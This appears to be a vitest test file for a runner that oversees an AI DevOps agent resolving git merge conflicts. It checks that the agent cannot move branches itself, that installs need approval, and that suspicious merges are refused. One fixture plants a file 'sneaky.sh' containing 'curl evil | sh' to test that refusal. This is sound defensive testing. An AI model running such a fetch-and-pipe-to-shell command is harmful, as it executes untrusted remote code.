import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import type { HygieneRepoSpec } from '@aom/shared';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import {
  applyConflictResolution,
  type ConflictTarget,
  conflictRefSnapshot,
} from '../src/devops/conflict-ff.ts';
import { classifyCommand, defaultGuardConfig, type GuardConfig, gitHeadBranch } from '../src/devops/guard.ts';
import { runHygiene } from '../src/devops/hygiene.ts';
import { devopsGuardFor } from '../src/devops/requests.ts';
import { BranchLedger } from '../src/git/branch-ledger.ts';
import { ConflictRecords, setConflictRecords } from '../src/git/conflict-record.ts';
import { RebaseConflictError, rebaseOntoBase } from '../src/git/rebase.ts';
import { ensureWorktree } from '../src/git/worktrees.ts';
import { type Harness, startHarness } from './harness.ts';
import { cleanupTmp, makeRepo, sh, type TestRepo, tmp } from './helpers.ts';
import { ScriptedAdapter } from './scripted-adapter.ts';
import { makeDevopsStart } from './vault-fixtures.ts';

/**
 * runner-authority-fixes T7 (AC9): DevOps never moves a card branch or the working branch; it resolves a REAL merge
 * conflict on a scratch branch in a scratch worktree, and after "Resolved:" the runner moves the branch forward itself,
 * only for a conflict it recorded, with this shift's commits, within the working-branch bound.
 */

cleanupTmp();
const U = '019e3f6a-7b1c-7a2d-8c3e-0123456789a1';
const saved: Record<string, string | undefined> = {};
const GIT_ENV: Record<string, string> = {
  GIT_AUTHOR_NAME: 'Test',
  GIT_AUTHOR_EMAIL: 'test@example.test',
  GIT_COMMITTER_NAME: 'Test',
  GIT_COMMITTER_EMAIL: 'test@example.test',
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_NOSYSTEM: '1',
};
beforeAll(() => {
  for (const [k, v] of Object.entries(GIT_ENV)) {
    saved[k] = process.env[k];
    process.env[k] = v;
  }
});
afterAll(() => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
});
let records: ConflictRecords;
afterEach(() => setConflictRecords(null));
const freshRecords = () => {
  records = new ConflictRecords(join(tmp(), 'conflicts.json'));
  setConflictRecords(records);
};

const CARD = 'guildwise/toy-1-fix';
const rev = (dir: string, ref = 'HEAD') => sh(dir, 'git', ['rev-parse', ref]);

/** Somebody else changes `file` on origin/main. */
function theirs(repo: TestRepo, file: string, text: string) {
  const other = join(tmp(), 'other');
  sh(repo.root, 'git', ['clone', repo.origin, other]);
  writeFileSync(join(other, file), text);
  sh(other, 'git', ['add', '-A']);
  sh(other, 'git', ['commit', '-m', `theirs ${file}`]);
  sh(other, 'git', ['push', 'origin', 'main']);
}

/** A card worktree whose branch conflicts with origin/main in README.md; the runner's rebase records the conflict. */
async function cardConflict() {
  freshRecords();
  const repo = makeRepo();
  const ledger = new BranchLedger(join(tmp(), 'card-branches.json'));
  const wt = join(tmp(), 'worktrees', 'TOY-0192abcd', 'TOY-1');
  await ensureWorktree({
    repoPath: repo.clone,
    roots: ['/'],
    spec: {
      mode: 'create',
      repoId: U,
      remoteUrlNormalized: repo.remoteNormalized,
      baseBranch: 'main',
      branchName: CARD,
    },
    defaultPath: wt,
    ledger,
  });
  writeFileSync(join(wt, 'README.md'), '# toy (card)\n');
  sh(wt, 'git', ['commit', '-am', 'card change']);
  theirs(repo, 'README.md', '# toy (main)\n');
  // the runner's own rebase before test: a real conflict, recorded
  await expect(rebaseOntoBase(wt, 'main', { name: 'Toy Dev', email: 'dev@toy.test' })).rejects.toBeInstanceOf(
    RebaseConflictError,
  );
  const head = rev(wt);
  expect(records.entries()).toEqual([expect.objectContaining({ branch: CARD, head, kind: 'card' })]);
  return { repo, wt, head, ledger };
}

/** DevOps resolves by MERGING origin/main into conflict/TOY-1-a<n> in a scratch worktree under the temp dir. */
function devopsResolves(repo: TestRepo, branchFrom: string, scratchName: string, extra?: () => void) {
  const scratch = join(tmp(), 'scratch');
  sh(repo.clone, 'git', ['worktree', 'add', '-b', scratchName, scratch, branchFrom]);
  sh(scratch, 'git', ['fetch', 'origin']);
  const m = (() => {
    try {
      sh(scratch, 'git', ['merge', 'origin/main']);
      return 'clean';
    } catch {
      return 'conflict';
    }
  })();
  expect(m).toBe('conflict'); // a real merge conflict
  writeFileSync(join(scratch, 'README.md'), '# toy (card and main)\n');
  extra?.();
  sh(scratch, 'git', ['add', '-A']);
  sh(scratch, 'git', ['commit', '--no-edit']);
  return { scratch, tip: rev(scratch) };
}

describe('AC9: a card conflict is resolved by DevOps on a scratch branch and moved by the runner', () => {
  it('a real conflict, merged in a scratch worktree, moves the card branch after "Resolved:"', async () => {
    const { repo, wt, head, ledger } = await cardConflict();
    const before = await conflictRefSnapshot(repo.clone);
    // the guard lets DevOps merge in the scratch worktree (outside the card worktrees folder) ...
    const cfg: GuardConfig = { ...defaultGuardConfig('shift'), cardWorktreesRoot: join(wt, '..', '..') };
    const { scratch, tip } = devopsResolves(repo, CARD, 'conflict/TOY-1-a1');
    expect(
      classifyCommand('git merge origin/main', cfg, scratch, { headBranch: gitHeadBranch }).decision,
    ).toBe('allowed');
    // ... but never the fast-forward of the card branch itself
    expect(
      classifyCommand('git merge --ff-only conflict/TOY-1-a1', cfg, wt, { headBranch: gitHeadBranch })
        .decision,
    ).toBe('refused');
    expect(rev(wt)).toBe(head);
    const target: ConflictTarget = { kind: 'card', repoPath: repo.clone, branch: CARD, ref: 'TOY-1' };
    const r = await applyConflictResolution({ target, before, records, ledger });
    expect(r.moved, r.note).toBe(true);
    expect(rev(repo.clone, `refs/heads/${CARD}`)).toBe(tip);
    expect(rev(wt)).toBe(tip); // the clean card worktree followed (merge --ff-only)
    expect(sh(repo.clone, 'git', ['branch', '--list', 'conflict/*'])).toBe('');
    expect(records.entries()).toEqual([]); // used once
    // the resolution descends from the card head: finalize keeps the merge
    expect(sh(repo.clone, 'git', ['merge-base', '--is-ancestor', head, tip])).toBe('');
  });

  it('nothing moves without a record, for a leftover attempt, for a non-descendant, a dirty worktree or main', async () => {
    // no record
    {
      const { repo, ledger } = await cardConflict();
      const before = await conflictRefSnapshot(repo.clone);
      devopsResolves(repo, CARD, 'conflict/TOY-1-a1');
      records.drop(repo.remoteNormalized, CARD, 'card');
      const r = await applyConflictResolution({
        target: { kind: 'card', repoPath: repo.clone, branch: CARD, ref: 'TOY-1' },
        before,
        records,
        ledger,
      });
      expect(r).toMatchObject({ moved: false, note: expect.stringContaining('did not see a conflict') });
    }
    // a leftover -a1 from an earlier attempt: the next conflict the runner records already holds it
    {
      const { repo, wt, ledger, head } = await cardConflict();
      devopsResolves(repo, CARD, 'conflict/TOY-1-a1');
      await expect(
        rebaseOntoBase(wt, 'main', { name: 'Toy Dev', email: 'dev@toy.test' }),
      ).rejects.toBeInstanceOf(RebaseConflictError);
      const before = await conflictRefSnapshot(repo.clone);
      const r = await applyConflictResolution({
        target: { kind: 'card', repoPath: repo.clone, branch: CARD, ref: 'TOY-1' },
        before,
        records,
        ledger,
      });
      expect(r.moved).toBe(false);
      expect(rev(repo.clone, `refs/heads/${CARD}`)).toBe(head);
    }
    // a non-descendant (a rebase-style result) is refused
    {
      const { repo, ledger, head } = await cardConflict();
      const before = await conflictRefSnapshot(repo.clone);
      sh(repo.clone, 'git', ['branch', 'conflict/TOY-1-a1', 'origin/main']);
      const r = await applyConflictResolution({
        target: { kind: 'card', repoPath: repo.clone, branch: CARD, ref: 'TOY-1' },
        before,
        records,
        ledger,
      });
      expect(r).toMatchObject({ moved: false, note: expect.stringContaining('does not build on') });
      expect(rev(repo.clone, `refs/heads/${CARD}`)).toBe(head);
    }
    // the card worktree is checked out and dirty
    {
      const { repo, wt, ledger, head } = await cardConflict();
      const before = await conflictRefSnapshot(repo.clone);
      devopsResolves(repo, CARD, 'conflict/TOY-1-a1');
      writeFileSync(join(wt, 'wip.txt'), 'unsaved\n');
      const r = await applyConflictResolution({
        target: { kind: 'card', repoPath: repo.clone, branch: CARD, ref: 'TOY-1' },
        before,
        records,
        ledger,
      });
      expect(r).toMatchObject({ moved: false, note: expect.stringContaining('uncommitted changes') });
      expect(rev(wt)).toBe(head);
    }
    // a server naming main as the card branch
    {
      const { repo, ledger } = await cardConflict();
      const before = await conflictRefSnapshot(repo.clone);
      const r = await applyConflictResolution({
        target: { kind: 'card', repoPath: repo.clone, branch: 'main', ref: 'TOY-1' },
        before,
        records,
        ledger,
      });
      expect(r).toMatchObject({ moved: false, note: expect.stringContaining('protected') });
    }
  }, 120_000);
});

describe('AC9: a working-branch conflict is resolved in a scratch worktree and moved by the runner', () => {
  const spec = (repo: TestRepo): HygieneRepoSpec => ({
    repoId: U,
    projectId: U,
    projectKey: 'TOY',
    projectName: 'Toy',
    name: 'toy',
    localPath: repo.clone,
    remoteUrl: repo.origin,
    workingBranch: 'main',
    branchSource: 'repo',
    branchPrefix: 'guildwise/',
    finishedBranches: [],
    mainBranch: null,
    finishedCards: [],
  });

  /** Local main and origin/main both changed README.md: hygiene marks a conflict and the runner records it. */
  async function workingConflict() {
    freshRecords();
    const repo = makeRepo();
    writeFileSync(join(repo.clone, 'README.md'), '# toy (local)\n');
    sh(repo.clone, 'git', ['commit', '-am', 'local change']);
    theirs(repo, 'README.md', '# toy (main)\n');
    const run = await runHygiene({ trigger: 'manual', repos: [spec(repo)] } as never);
    expect(run.report.repos[0]?.problem?.kind).toBe('conflict');
    const head = rev(repo.clone, 'refs/heads/main');
    expect(records.entries()).toEqual([
      expect.objectContaining({
        branch: 'main',
        head,
        originHead: rev(repo.clone, 'origin/main'),
        kind: 'working',
      }),
    ]);
    expect(sh(repo.clone, 'git', ['symbolic-ref', '--short', 'HEAD'])).toBe('main');
    return { repo, head };
  }
  const target = (repo: TestRepo): ConflictTarget => ({
    kind: 'working',
    repoPath: repo.clone,
    branch: 'main',
  });

  it('the guard freezes main for the request; the merge in the scratch worktree passes; the runner moves main', async () => {
    const { repo, head } = await workingConflict();
    const before = await conflictRefSnapshot(repo.clone);
    const base = makeDevopsStart({ summary: 'resolve' }) as Record<string, any>;
    const guard = devopsGuardFor({
      ...base,
      devops: { ...base.devops, conflictRepo: { repoId: U, localPath: repo.clone, workingBranch: 'main' } },
    } as never);
    expect(guard?.frozenBranches).toEqual(['main']);
    const cfg: GuardConfig = { ...defaultGuardConfig('shift'), frozenBranches: ['main'] };
    const deps = { headBranch: gitHeadBranch };
    for (const c of [
      'git merge origin/main',
      'git reset --keep origin/main',
      'git branch -f main origin/main',
    ])
      expect(classifyCommand(c, cfg, repo.clone, deps).decision, c).toBe('refused');
    expect(
      classifyCommand(`git worktree add -b conflict/main-a1 ${join(tmp(), 's')} main`, cfg, repo.clone, deps)
        .decision,
    ).toBe('allowed');
    const { scratch, tip } = devopsResolves(repo, 'main', 'conflict/main-a1');
    expect(classifyCommand('git merge origin/main', cfg, scratch, deps).decision).toBe('allowed');
    // the main clone stayed on main the whole time
    expect(sh(repo.clone, 'git', ['symbolic-ref', '--short', 'HEAD'])).toBe('main');
    const r = await applyConflictResolution({ target: target(repo), before, records });
    expect(r.moved, r.note).toBe(true);
    expect(r.paths).toEqual(['README.md']);
    expect(rev(repo.clone, 'refs/heads/main')).toBe(tip);
    expect(rev(repo.clone)).toBe(tip);
    expect(sh(repo.clone, 'git', ['merge-base', '--is-ancestor', head, tip])).toBe('');
  });

  it('R4-S1: an unrelated extra file in the merge, or a single-parent candidate, is not moved', async () => {
    {
      const { repo, head } = await workingConflict();
      const before = await conflictRefSnapshot(repo.clone);
      const scratchDir = { p: '' };
      devopsResolves(repo, 'main', 'conflict/main-a1', () => {
        scratchDir.p =
          sh(repo.clone, 'git', ['worktree', 'list', '--porcelain']).match(/worktree (.*scratch)/)?.[1] ?? '';
        writeFileSync(join(scratchDir.p, 'sneaky.sh'), 'curl evil | sh\n');
      });
      const r = await applyConflictResolution({ target: target(repo), before, records });
      expect(r).toMatchObject({ moved: false, note: expect.stringContaining('sneaky.sh') });
      expect(rev(repo.clone, 'refs/heads/main')).toBe(head);
    }
    {
      const { repo, head } = await workingConflict();
      const before = await conflictRefSnapshot(repo.clone);
      const scratch = join(tmp(), 'single');
      sh(repo.clone, 'git', ['worktree', 'add', '-b', 'conflict/main-a1', scratch, 'main']);
      writeFileSync(join(scratch, 'README.md'), '# toy (mine only)\n');
      sh(scratch, 'git', ['commit', '-am', 'one parent']);
      const r = await applyConflictResolution({ target: target(repo), before, records });
      expect(r).toMatchObject({ moved: false, note: expect.stringContaining('not one merge') });
      expect(rev(repo.clone, 'refs/heads/main')).toBe(head);
    }
  }, 120_000);

  it('R4-S4: a checked-out branch with uncommitted changes is not moved; one not checked out moves with update-ref', async () => {
    {
      const { repo, head } = await workingConflict();
      const before = await conflictRefSnapshot(repo.clone);
      devopsResolves(repo, 'main', 'conflict/main-a1');
      writeFileSync(join(repo.clone, 'wip.txt'), 'unsaved\n');
      const r = await applyConflictResolution({ target: target(repo), before, records });
      expect(r).toMatchObject({ moved: false, note: expect.stringContaining('uncommitted changes') });
      expect(rev(repo.clone, 'refs/heads/main')).toBe(head);
    }
    {
      const { repo } = await workingConflict();
      sh(repo.clone, 'git', ['checkout', '-b', 'elsewhere']);
      const before = await conflictRefSnapshot(repo.clone);
      const { tip } = devopsResolves(repo, 'main', 'conflict/main-a1');
      const r = await applyConflictResolution({ target: target(repo), before, records });
      expect(r.moved, r.note).toBe(true);
      expect(rev(repo.clone, 'refs/heads/main')).toBe(tip);
      expect(sh(repo.clone, 'git', ['symbolic-ref', '--short', 'HEAD'])).toBe('elsewhere');
    }
  }, 120_000);
});

describe('AC9: the supervisor runs the runner step after a terminal "Resolved:" only', () => {
  let h: Harness | undefined;
  afterEach(async () => {
    await h?.stop();
    h = undefined;
  });

  async function devopsShift(summary: string) {
    const repo = makeRepo();
    let made: { tip: string } | undefined;
    const adapter = new ScriptedAdapter(async (_i, ctl) => {
      made = devopsResolves(repo, CARD, 'conflict/TOY-1-a1');
      await ctl.post('/v1/report', {
        report: { kind: 'outcome', outcomeId: 'devops_done', note: summary, data: { summary, commands: [] } },
      });
    });
    h = await startHarness({}, { adapters: new Map([['mock', adapter]]) }, repo);
    // the runner's own rebase of the card branch conflicted (recorded in the runner's conflicts.json)
    const wt = join(tmp(), 'card-wt');
    await ensureWorktree({
      repoPath: repo.clone,
      roots: ['/'],
      spec: {
        mode: 'create',
        repoId: U,
        remoteUrlNormalized: repo.remoteNormalized,
        baseBranch: 'main',
        branchName: CARD,
      },
      defaultPath: wt,
    });
    writeFileSync(join(wt, 'README.md'), '# toy (card)\n');
    sh(wt, 'git', ['commit', '-am', 'card change']);
    theirs(repo, 'README.md', '# toy (main)\n');
    await expect(
      rebaseOntoBase(wt, 'main', { name: 'Toy Dev', email: 'dev@toy.test' }),
    ).rejects.toBeInstanceOf(RebaseConflictError);
    const head = rev(wt);
    const base = makeDevopsStart({ summary: 'resolve the conflict' }) as Record<string, any>;
    const msg: Record<string, any> = {
      ...base,
      devops: {
        ...base.devops,
        card: { ref: 'TOY-1', title: 'Fix', remoteUrlNormalized: repo.remoteNormalized },
        conflictCard: { ref: 'TOY-1', branch: CARD },
      },
    };
    h.server.send('shift.start', msg);
    await h.server.waitFor('shift.ended', (m) => m.shiftId === msg.shiftId, 60_000);
    await h.runner.supervisor.whenSettled(msg.shiftId);
    return { repo, head, tip: made?.tip };
  }

  it('"Resolved:" moves the card branch to the scratch result', async () => {
    const { repo, tip } = await devopsShift('Resolved: kept both headings');
    expect(tip).toBeTruthy();
    expect(rev(repo.clone, `refs/heads/${CARD}`)).toBe(tip);
  }, 90_000);

  it('"Not resolved:" leaves the card branch where it was', async () => {
    const { repo, head } = await devopsShift('Not resolved: the tests failed');
    expect(rev(repo.clone, `refs/heads/${CARD}`)).toBe(head);
  }, 90_000);
});

describe('Rework 1 (B2): installs off, "npm ci" asks, the request resumes, then "Resolved:" moves the branch', () => {
  let h: Harness | undefined;
  afterEach(async () => {
    await h?.stop();
    h = undefined;
  });

  it('the scratch merge made in shift 1 is moved after "Resolved:" in the resumed shift 2', async () => {
    const repo = makeRepo();
    let made: { tip: string } | undefined;
    let shift = 0;
    const reports: Array<Record<string, unknown>> = [];
    const adapter = new ScriptedAdapter(async (input, ctl) => {
      shift++;
      if (shift === 1) {
        made = devopsResolves(repo, CARD, 'conflict/TOY-1-a1');
        // the build step needs an install: the guard (installs off) refuses `npm ci` and records it
        const guard = { ...defaultGuardConfig('shift'), ...(input.devopsGuard as object) } as GuardConfig;
        const v = classifyCommand('npm ci', guard, '/tmp');
        expect(v).toMatchObject({ decision: 'refused', rule: 'install_off' });
        await ctl.post('/v1/rpc', {
          method: 'devops.audit',
          params: {
            entries: [
              {
                at: new Date().toISOString(),
                sessionRef: input.shiftId,
                kind: 'shift',
                decision: 'refused',
                rule: v.rule,
                command: 'npm ci',
              },
            ],
          },
        });
        await ctl.post('/v1/report', {
          report: {
            kind: 'outcome',
            outcomeId: 'devops_approval',
            note: 'Needs approval',
            data: {
              action: 'run npm ci',
              reason: 'the tests need it',
              commands: ['npm ci'],
              blockedBy: 'allowInstall',
            },
          },
        });
        return;
      }
      // shift 2: resumed with the owner's "Allow once": npm ci passes the guard now
      const guard = { ...defaultGuardConfig('shift'), ...(input.devopsGuard as object) } as GuardConfig;
      expect(classifyCommand('npm ci', guard, '/tmp').decision).toBe('allowed');
      await ctl.post('/v1/report', {
        report: {
          kind: 'outcome',
          outcomeId: 'devops_done',
          note: 'Resolved: kept both headings',
          data: { summary: 'Resolved: kept both headings', commands: ['npm ci'] },
        },
      });
    });
    h = await startHarness({}, { adapters: new Map([['mock', adapter]]) }, repo);
    const wt = join(tmp(), 'card-wt');
    await ensureWorktree({
      repoPath: repo.clone,
      roots: ['/'],
      spec: {
        mode: 'create',
        repoId: U,
        remoteUrlNormalized: repo.remoteNormalized,
        baseBranch: 'main',
        branchName: CARD,
      },
      defaultPath: wt,
    });
    writeFileSync(join(wt, 'README.md'), '# toy (card)\n');
    sh(wt, 'git', ['commit', '-am', 'card change']);
    theirs(repo, 'README.md', '# toy (main)\n');
    await expect(
      rebaseOntoBase(wt, 'main', { name: 'Toy Dev', email: 'dev@toy.test' }),
    ).rejects.toBeInstanceOf(RebaseConflictError);
    const head = rev(wt);
    const base = makeDevopsStart({ summary: 'resolve the conflict' }) as Record<string, any>;
    const devops = {
      ...base.devops,
      card: { ref: 'TOY-1', title: 'Fix', remoteUrlNormalized: repo.remoteNormalized },
      conflictCard: { ref: 'TOY-1', branch: CARD },
    };
    const first: Record<string, any> = { ...base, devops };
    h.server.send('shift.start', first);
    const asked = await h.server.waitFor(
      'shift.report',
      (m) =>
        m.shiftId === first.shiftId && (m.report as { outcomeId?: string }).outcomeId === 'devops_approval',
      60_000,
    );
    reports.push((asked.report as { data: Record<string, unknown> }).data);
    await h.server.waitFor('shift.ended', (m) => m.shiftId === first.shiftId, 60_000);
    await h.runner.supervisor.whenSettled(first.shiftId);
    expect(reports[0]).toMatchObject({ blockedBy: 'allowInstall', commands: ['npm ci'] });
    expect(rev(repo.clone, `refs/heads/${CARD}`)).toBe(head);
    // the owner chose "Allow once": the same request resumes in a new shift with that exact command approved
    const again = makeDevopsStart({
      summary: 'resolve the conflict',
      approval: { action: 'run npm ci', reason: 'the tests need it', commands: ['npm ci'] },
    }) as Record<string, any>;
    const second: Record<string, any> = {
      ...again,
      devops: { ...devops, approval: again.devops.approval },
    };
    h.server.send('shift.start', second);
    await h.server.waitFor('shift.ended', (m) => m.shiftId === second.shiftId, 60_000);
    await h.runner.supervisor.whenSettled(second.shiftId);
    expect(made?.tip).toBeTruthy();
    expect(rev(repo.clone, `refs/heads/${CARD}`)).toBe(made?.tip);
  }, 120_000);
});

describe('quiet-approvals S7: conflict work in the box, in the runner-made scratch clone', () => {
  let h: Harness | undefined;
  afterEach(async () => {
    await h?.stop();
    h = undefined;
  });

  /** A scripted runtime that builds the box (like Claude Code with bubblewrap present). */
  class BoxScripted extends ScriptedAdapter {
    boxMissing(): string | null {
      return null;
    }
  }

  async function boxedConflict(o: {
    summary: string;
    resolve: (clone: string) => void;
    checks?: Array<Record<string, unknown>>;
  }) {
    const repo = makeRepo();
    let cwd = '';
    const adapter = new BoxScripted(async (input, ctl) => {
      cwd = input.cwd;
      o.resolve(join(input.cwd, 'clone'));
      await ctl.post('/v1/report', {
        report: {
          kind: 'outcome',
          outcomeId: 'devops_done',
          note: o.summary,
          data: { summary: o.summary, commands: [] },
        },
      });
    });
    h = await startHarness({}, { adapters: new Map([['mock', adapter]]) }, repo);
    const wt = join(tmp(), 'card-wt');
    await ensureWorktree({
      repoPath: repo.clone,
      roots: ['/'],
      spec: {
        mode: 'create',
        repoId: U,
        remoteUrlNormalized: repo.remoteNormalized,
        baseBranch: 'main',
        branchName: CARD,
      },
      defaultPath: wt,
    });
    writeFileSync(join(wt, 'README.md'), '# toy (card)\n');
    sh(wt, 'git', ['commit', '-am', 'card change']);
    theirs(repo, 'README.md', '# toy (main)\n');
    await expect(
      rebaseOntoBase(wt, 'main', { name: 'Toy Dev', email: 'dev@toy.test' }),
    ).rejects.toBeInstanceOf(RebaseConflictError);
    const head = rev(wt);
    const base = makeDevopsStart({ summary: 'resolve the conflict' }) as Record<string, any>;
    const msg: Record<string, any> = {
      ...base,
      orgId: '0190a000-0000-7000-8000-000000000001',
      brief: { ...base.brief, ...(o.checks ? { checks: { suites: o.checks, detect: false } } : {}) },
      devops: {
        ...base.devops,
        card: { ref: 'TOY-1', title: 'Fix', remoteUrlNormalized: repo.remoteNormalized },
        conflictCard: { ref: 'TOY-1', branch: CARD },
      },
    };
    h.server.send('shift.start', msg);
    await h.server.waitFor('shift.ended', (m) => m.shiftId === msg.shiftId, 90_000);
    await h.runner.supervisor.whenSettled(msg.shiftId);
    return { repo, head, cwd, input: adapter.inputs[0], h };
  }

  /** DevOps resolves the REAL conflict in the scratch clone: merge origin/main into conflict/TOY-1-a1. */
  const resolveIn = (clone: string, text = '# toy (card and main)\n') => {
    sh(clone, 'git', ['checkout', '-q', '-b', 'conflict/TOY-1-a1']);
    let conflicted = false;
    try {
      sh(clone, 'git', ['merge', 'refs/remotes/origin/main']);
    } catch {
      conflicted = true;
    }
    expect(conflicted).toBe(true);
    writeFileSync(join(clone, 'README.md'), text);
    sh(clone, 'git', ['add', '-A']);
    sh(clone, 'git', ['commit', '--no-edit']);
  };

  it('runs in the box without a hold, in its scratch clone; "Resolved:" makes the runner move the card branch', async () => {
    let tip = '';
    const r = await boxedConflict({
      summary: 'Resolved: kept both headings',
      resolve: (clone) => {
        resolveIn(clone);
        tip = rev(clone);
      },
    });
    expect(r.input?.devopsBox).toBe(true);
    expect(r.input?.boxReadOnly).toEqual([
      join(r.cwd, 'clone', '.git', 'config'),
      join(r.cwd, 'clone', '.git', 'hooks'),
    ]);
    expect(r.h.server.of('approvals.held').every((m) => m.items.length === 0)).toBe(true);
    expect(rev(r.repo.clone, `refs/heads/${CARD}`)).toBe(tip);
  }, 120_000);

  it('a configured check that fails refuses the move (run before it, in the check sandbox)', async () => {
    const r = await boxedConflict({
      summary: 'Resolved: kept both headings',
      resolve: (clone) => resolveIn(clone),
      checks: [
        {
          name: 'lint',
          repoId: U,
          cwd: '.',
          cmd: ['sh', '-c', 'grep -q "card and main" README.md && exit 3'],
          kind: 'check',
        },
      ],
    });
    expect(rev(r.repo.clone, `refs/heads/${CARD}`)).toBe(r.head);
    const notes = r.h.server
      .of('shift.progress')
      .flatMap((m) => (m as { items?: Array<{ text: string }> }).items ?? []);
    expect(JSON.stringify(notes)).toMatch(/was not moved: the checks refused the resolution/);
  }, 120_000);

  it('a passing configured check lets the move go ahead', async () => {
    let tip = '';
    const r = await boxedConflict({
      summary: 'Resolved: kept both headings',
      resolve: (clone) => {
        resolveIn(clone);
        tip = rev(clone);
      },
      checks: [
        {
          name: 'lint',
          repoId: U,
          cwd: '.',
          cmd: ['sh', '-c', 'grep -q "card and main" README.md'],
          kind: 'check',
        },
      ],
    });
    expect(rev(r.repo.clone, `refs/heads/${CARD}`)).toBe(tip);
  }, 120_000);

  it('a resolution that restores an earlier tree (tree_revert) is not moved', async () => {
    const r = await boxedConflict({
      summary: 'Resolved: took main',
      resolve: (clone) => {
        // "resolve" by putting back the tree of the commit before the card change (it undoes the card's work)
        sh(clone, 'git', ['checkout', '-q', '-b', 'conflict/TOY-1-a1']);
        sh(clone, 'git', ['checkout', 'HEAD~1', '--', '.']);
        sh(clone, 'git', ['commit', '-q', '-m', 'revert to before']);
      },
    });
    expect(rev(r.repo.clone, `refs/heads/${CARD}`)).toBe(r.head);
  }, 120_000);
});
